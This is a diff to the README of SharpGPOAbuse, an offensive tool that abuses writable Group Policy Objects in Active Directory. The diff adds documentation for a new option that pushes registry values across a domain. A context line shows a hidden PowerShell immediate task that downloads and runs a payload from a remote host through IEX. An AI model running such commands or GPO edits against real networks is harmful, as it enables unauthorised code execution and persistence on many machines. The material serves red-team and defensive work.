@@ -23,6 +23,7 @@ Currently SharpGPOAbuse supports the following options:
 | [--AddUserScript](#configuring-a-user-or-computer-logon-script)      | Configure a user logon script             |
 | [--AddComputerTask](#configuring-a-computer-or-user-immediate-task)    | Configure a computer immediate task       |
 | [--AddUserTask](#configuring-a-computer-or-user-immediate-task)        | Add an immediate task to a user           |
+| [--AddRegistryKey](#adding-a-registry-key)        | Add/modify registry across the domain           |
 
 ## Attack Options
 
@@ -109,6 +110,27 @@ If you want to run the malicious task only on a specific user or computer contro
 SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO" --FilterEnabled --TargetDnsName target.domain.com
 
 ```
+
+### Adding a Registry Key 
+```
+Options required to set a registry key:
+--KeyPath
+        The path to the registry key.
+--KeyName
+        The name of the registry key.
+--KeyType
+        The type of data to place into the registry key.
+--KeyData
+        The data to place into the registry key.
+--Hive
+        The registry hive to affect, can be HKLM or HCU.
+--GPOName
+        The name of the vulnerable GPO.
+```
+
+Right now, the only KeyType supported is REG_DWORD.
+Do NOT include the HIVE in KeyPath!
+Hive only accepts HKLM, and HCU.
 
 ## Additional Options 
 | Option               | Description                               |
